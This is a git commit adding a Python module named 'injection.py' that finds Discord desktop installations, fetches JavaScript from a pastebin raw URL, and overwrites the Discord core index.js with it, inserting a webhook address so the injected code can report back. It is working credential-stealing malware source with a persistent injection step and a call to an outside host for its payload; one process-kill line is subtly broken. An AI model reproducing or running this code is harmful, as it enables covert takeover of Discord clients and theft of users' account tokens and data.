e1c86ce92726ac40f2a29e5941e8ba1377c868e7
badafofozapdc <shirozensp@gmail.com>
2023-07-27 02:04:24 -0300

    Primeiro commit

---
+++ src/components/injection.py
@@ -0,0 +1,46 @@
+import os
+import re
+import subprocess
+
+import psutil
+import requests
+
+
+class Injection:
+    def __init__(self, webhook: str) -> None:
+        self.appdata = os.getenv('LOCALAPPDATA')
+        self.discord_dirs = [
+            self.appdata + '\\Discord',
+            self.appdata + '\\DiscordCanary',
+            self.appdata + '\\DiscordPTB',
+            self.appdata + '\\DiscordDevelopment'
+        ]
+        self.code = requests.get('https://pastebin.com/raw/5YeFJK1k').text
+        
+        for proc in psutil.process_iter():
+            if 'discord' in proc.name().lower():
+                proc.kill
+
+        for dir in self.discord_dirs:
+            if not os.path.exists(dir):
+                continue
+
+            if self.get_core(dir) is not None:
+                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
+                    f.write((self.code).replace('discord_desktop_core-1',
+                            self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
+                    self.start_discord(dir)
+
+    def get_core(self, dir: str) -> tuple:
+        for file in os.listdir(dir):
+            if re.search(r'app-+?', file):
+                modules = dir + '\\' + file + '\\modules'
+                if not os.path.exists(modules):
+                    continue
+                for file in os.listdir(modules):
+                    if re.search(r'discord_desktop_core-+?', file):
+                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
+                        if not os.path.exists(core + '\\index.js'):
+                            continue
+
+                        return core, file
